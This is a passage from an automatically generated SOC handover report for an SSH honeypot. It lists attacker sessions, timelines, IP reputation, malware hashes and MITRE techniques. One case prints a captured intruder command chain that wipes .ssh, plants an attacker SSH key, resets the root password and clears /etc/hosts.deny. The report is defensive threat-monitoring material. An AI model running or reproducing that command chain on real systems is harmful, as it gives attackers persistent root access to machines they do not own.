| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:46:11` | `cowrie.session.connect` |
| `2026-04-06 07:46:11` | `cowrie.client.version` |
| `2026-04-06 07:46:11` | `cowrie.client.kex` |
| `2026-04-06 07:46:11` | `cowrie.login.success` |
| `2026-04-06 07:46:12` | `cowrie.session.params` |
| `2026-04-06 07:46:12` | `cowrie.command.input` |
| `2026-04-06 07:46:12` | `cowrie.command.failed` |
| `2026-04-06 07:46:12` | `cowrie.log.closed` |
| `2026-04-06 07:46:12` | `cowrie.session.params` |
| `2026-04-06 07:46:12` | `cowrie.command.input` |
| `2026-04-06 07:46:13` | `cowrie.session.file_download` |
| `2026-04-06 07:46:13` | `cowrie.log.closed` |
| `2026-04-06 07:46:21` | `cowrie.session.params` |
| `2026-04-06 07:46:21` | `cowrie.command.input` |
| `2026-04-06 07:46:21` | `cowrie.log.closed` |
| `2026-04-06 07:46:21` | `cowrie.session.params` |
| `2026-04-06 07:46:21` | `cowrie.command.input` |
| `2026-04-06 07:46:21` | `cowrie.log.closed` |
| `2026-04-06 07:46:22` | `cowrie.session.params` |
| `2026-04-06 07:46:22` | `cowrie.command.input` |
| `2026-04-06 07:46:22` | `cowrie.session.file_download` |
| `2026-04-06 07:46:22` | `cowrie.log.closed` |
| `2026-04-06 07:46:22` | `cowrie.session.params` |
| `2026-04-06 07:46:22` | `cowrie.command.input` |
| `2026-04-06 07:46:22` | `cowrie.log.closed` |
| `2026-04-06 07:46:23` | `cowrie.session.params` |
| `2026-04-06 07:46:23` | `cowrie.command.input` |
| `2026-04-06 07:46:23` | `cowrie.log.closed` |
| `2026-04-06 07:46:23` | `cowrie.session.params` |
| `2026-04-06 07:46:23` | `cowrie.command.input` |
| `2026-04-06 07:46:23` | `cowrie.command.input` |
| `2026-04-06 07:46:23` | `cowrie.log.closed` |
| `2026-04-06 07:46:24` | `cowrie.session.params` |
| `2026-04-06 07:46:24` | `cowrie.command.input` |
| `2026-04-06 07:46:24` | `cowrie.log.closed` |
| `2026-04-06 07:46:24` | `cowrie.session.params` |
| `2026-04-06 07:46:24` | `cowrie.command.input` |
| `2026-04-06 07:46:24` | `cowrie.log.closed` |
| `2026-04-06 07:46:25` | `cowrie.session.params` |
| `2026-04-06 07:46:25` | `cowrie.command.input` |
| `2026-04-06 07:46:25` | `cowrie.log.closed` |
| `2026-04-06 07:46:25` | `cowrie.session.params` |
| `2026-04-06 07:46:25` | `cowrie.command.input` |
| `2026-04-06 07:46:25` | `cowrie.log.closed` |
| `2026-04-06 07:46:26` | `cowrie.session.params` |
| `2026-04-06 07:46:26` | `cowrie.command.input` |
| `2026-04-06 07:46:26` | `cowrie.log.closed` |
| `2026-04-06 07:46:26` | `cowrie.session.params` |
| `2026-04-06 07:46:26` | `cowrie.command.input` |
| `2026-04-06 07:46:26` | `cowrie.log.closed` |
| `2026-04-06 07:46:27` | `cowrie.session.params` |
| `2026-04-06 07:46:27` | `cowrie.command.input` |
| `2026-04-06 07:46:27` | `cowrie.log.closed` |
| `2026-04-06 07:46:27` | `cowrie.session.params` |
| `2026-04-06 07:46:27` | `cowrie.command.input` |
| `2026-04-06 07:46:27` | `cowrie.log.closed` |
| `2026-04-06 07:46:28` | `cowrie.session.params` |
| `2026-04-06 07:46:28` | `cowrie.command.input` |
| `2026-04-06 07:46:28` | `cowrie.log.closed` |
| `2026-04-06 07:46:28` | `cowrie.session.params` |
| `2026-04-06 07:46:28` | `cowrie.command.input` |
| `2026-04-06 07:46:28` | `cowrie.log.closed` |
| `2026-04-06 07:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6095836a5f7

| Field | Detail |
|---|---|
| **Source IP** | `203.83.231[.]93` |
| **First Seen** | 2026-04-06 07:47 |
| **Last Seen** | 2026-04-06 07:47 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:nxd7VDlMjkv0"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 07:47:31` | `cowrie.session.connect` |
| `2026-04-06 07:47:31` | `cowrie.client.version` |
| `2026-04-06 07:47:31` | `cowrie.client.kex` |
| `2026-04-06 07:47:32` | `cowrie.login.success` |
| `2026-04-06 07:47:32` | `cowrie.session.params` |
| `2026-04-06 07:47:32` | `cowrie.command.input` |
| `2026-04-06 07:47:32` | `cowrie.command.failed` |
| `2026-04-06 07:47:32` | `cowrie.log.closed` |
| `2026-04-06 07:47:33` | `cowrie.session.params` |
| `2026-04-06 07:47:33` | `cowrie.command.input` |
| `2026-04-06 07:47:33` | `cowrie.session.file_download` |
| `2026-04-06 07:47:33` | `cowrie.log.closed` |
| `2026-04-06 07:47:46` | `cowrie.session.params` |
| `2026-04-06 07:47:46` | `cowrie.command.input` |
| `2026-04-06 07:47:46` | `cowrie.log.closed` |
| `2026-04-06 07:47:47` | `cowrie.session.params` |
| `2026-04-06 07:47:47` | `cowrie.command.input` |
| `2026-04-06 07:47:47` | `cowrie.log.closed` |
| `2026-04-06 07:47:47` | `cowrie.session.params` |
| `2026-04-06 07:47:47` | `cowrie.command.input` |
| `2026-04-06 07:47:48` | `cowrie.session.file_download` |
| `2026-04-06 07:47:48` | `cowrie.log.closed` |
| `2026-04-06 07:47:48` | `cowrie.session.params` |
| `2026-04-06 07:47:48` | `cowrie.command.input` |
| `2026-04-06 07:47:48` | `cowrie.log.closed` |
| `2026-04-06 07:47:48` | `cowrie.session.params` |
| `2026-04-06 07:47:48` | `cowrie.command.input` |
| `2026-04-06 07:47:49` | `cowrie.log.closed` |
| `2026-04-06 07:47:49` | `cowrie.session.params` |
| `2026-04-06 07:47:49` | `cowrie.command.input` |
| `2026-04-06 07:47:49` | `cowrie.command.input` |
| `2026-04-06 07:47:49` | `cowrie.log.closed` |
| `2026-04-06 07:47:50` | `cowrie.session.params` |
| `2026-04-06 07:47:50` | `cowrie.command.input` |
| `2026-04-06 07:47:50` | `cowrie.log.closed` |
| `2026-04-06 07:47:50` | `cowrie.session.params` |
| `2026-04-06 07:47:50` | `cowrie.command.input` |
| `2026-04-06 07:47:50` | `cowrie.log.closed` |
| `2026-04-06 07:47:51` | `cowrie.session.params` |
| `2026-04-06 07:47:51` | `cowrie.command.input` |
| `2026-04-06 07:47:51` | `cowrie.log.closed` |
| `2026-04-06 07:47:51` | `cowrie.session.params` |
| `2026-04-06 07:47:51` | `cowrie.command.input` |
| `2026-04-06 07:47:51` | `cowrie.log.closed` |
| `2026-04-06 07:47:52` | `cowrie.session.params` |
| `2026-04-06 07:47:52` | `cowrie.command.input` |
| `2026-04-06 07:47:52` | `cowrie.log.closed` |
| `2026-04-06 07:47:52` | `cowrie.session.params` |
| `2026-04-06 07:47:52` | `cowrie.command.input` |
| `2026-04-06 07:47:52` | `cowrie.log.closed` |
| `2026-04-06 07:47:53` | `cowrie.session.params` |
| `2026-04-06 07:47:53` | `cowrie.command.input` |
| `2026-04-06 07:47:53` | `cowrie.log.closed` |
| `2026-04-06 07:47:53` | `cowrie.session.params` |
| `2026-04-06 07:47:53` | `cowrie.command.input` |
| `2026-04-06 07:47:53` | `cowrie.log.closed` |
| `2026-04-06 07:47:54` | `cowrie.session.params` |
| `2026-04-06 07:47:54` | `cowrie.command.input` |
| `2026-04-06 07:47:54` | `cowrie.log.closed` |
| `2026-04-06 07:47:54` | `cowrie.session.params` |
| `2026-04-06 07:47:54` | `cowrie.command.input` |
| `2026-04-06 07:47:54` | `cowrie.log.closed` |
| `2026-04-06 07:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.231[.]93` to AbuseIPDB if not already reported
- [ ] Block `203.83.231[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.62.8[.]17` | **25** | 2026-04-06 06:34 | 2026-04-06 07:00 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.84.53[.]142` | **25** | 2026-04-06 06:33 | 2026-04-06 07:01 | 3m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]248` | **16** | 2026-04-06 07:44 | 2026-04-06 07:50 | 18m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.255.3[.]203` | **6** | 2026-04-06 05:59 | 2026-04-06 06:15 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `203.83.231[.]93` | **5** | 2026-04-06 07:45 | 2026-04-06 07:50 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.79[.]11` | **4** | 2026-04-06 05:59 | 2026-04-06 06:58 | 5m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.82.78[.]106` | **4** | 2026-04-06 06:46 | 2026-04-06 06:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.118.240[.]192` | **2** | 2026-04-06 07:09 | 2026-04-06 07:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `43.156.19[.]37` | **2** | 2026-04-06 06:53 | 2026-04-06 07:01 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.159.54[.]61` | 1 | 2026-04-06 07:43 | 2026-04-06 07:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.175.30[.]230` | 1 | 2026-04-06 06:41 | 2026-04-06 06:41 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.112.194[.]160` | 1 | 2026-04-06 07:25 | 2026-04-06 07:25 | 14s | 0 | `T1592` | 🟢 LOW |
| `112.121.204[.]181` | 1 | 2026-04-06 06:51 | 2026-04-06 06:52 | 16s | 0 | `T1592` | 🟢 LOW |
| `113.194.203[.]31` | 1 | 2026-04-06 06:00 | 2026-04-06 06:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.123[.]76` | 1 | 2026-04-06 06:33 | 2026-04-06 06:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `135.235.138[.]43` | 1 | 2026-04-06 07:43 | 2026-04-06 07:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.149[.]158` | 1 | 2026-04-06 07:47 | 2026-04-06 07:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.248.47[.]114` | 1 | 2026-04-06 07:18 | 2026-04-06 07:18 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.104[.]44` | 1 | 2026-04-06 07:41 | 2026-04-06 07:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-04-06 06:30 | 2026-04-06 06:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-04-06 06:04 | 2026-04-06 06:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.35.52[.]241` | 1 | 2026-04-06 07:35 | 2026-04-06 07:35 | 30s | 0 | `T1592` | 🟢 LOW |
| `68.68.185[.]95` | 1 | 2026-04-06 06:26 | 2026-04-06 06:27 | 34s | 0 | `T1592` | 🟢 LOW |
| `73.56.2[.]41` | 1 | 2026-04-06 06:01 | 2026-04-06 06:01 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `5.35.52[.]241` | RU | Grand Ltd | **100** ⚠️ | 19 |
| `112.121.204[.]181` | KR | CMB Kwangju Broadcasting | **100** ⚠️ | 2 |
| `103.159.54[.]61` | VN | HT3 VIETNAM TECHNOLOGY INVESTMENT AND DEVELOPMENT JOINT STOCK COMPANY | **100** ⚠️ | 2 |
| `138.84.53[.]142` | CO | Starlink Colombia S.A.S. | **100** ⚠️ | 2 |
| `45.82.78[.]106` | SG | Detai Prosperous Technologies Limited | **100** ⚠️ | 50 |
| `106.112.194[.]160` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `180.76.104[.]44` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 49 |
| `120.62.8[.]17` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 50 |
| `103.175.30[.]230` | IN | AIRNET FIBER SOLUTIONS | **100** ⚠️ | 50 |
| `218.78.132[.]164` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 142 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 65 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 48 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 25 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 154 cases |
| Tool 34  | Credential Extractor        | ✅ 113 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (2.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 46 priority case(s) shown individually · 24 recon entry/entries in table (9 group(s) consolidating 89 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-06T07:52:12Z_
